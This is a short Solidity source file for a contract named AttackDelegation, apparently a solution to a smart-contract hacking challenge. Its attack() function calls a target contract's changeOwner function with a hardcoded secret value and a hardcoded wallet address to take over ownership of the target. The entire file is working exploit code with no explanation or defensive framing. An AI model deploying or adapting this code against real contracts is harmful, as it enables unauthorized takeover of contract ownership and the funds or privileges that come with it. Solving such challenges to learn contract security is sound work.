// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITargetContract {}
contract AttackDelegation {
    ITargetContract delegation;
    address _targetContractAddress;

    event Log(address sender, string message);
    event printData(address sender, bytes data);
    constructor(address targetContractAddress) {
        _targetContractAddress = targetContractAddress;
        delegation = ITargetContract(_targetContractAddress);
    }
    
    function attack() public payable {
        address wallet_address = 0xed2619Ef7FfD7376EE7A510ec6601bc3e6659dE1;
        bytes32 secret = 0x00000000000000000000000000000000000000007465737490aa7465737490aa;
        //bytes memory secretBytes = abi.encodePacked(secret);
        (bool success, /*bytes memory data*/) = _targetContractAddress.call(abi.encodeWithSignature("changeOwner(bytes32,address)", secret, wallet_address));
        require(success, "Target contract call failed"); 
        //emit printData(msg.sender, data);
    }
}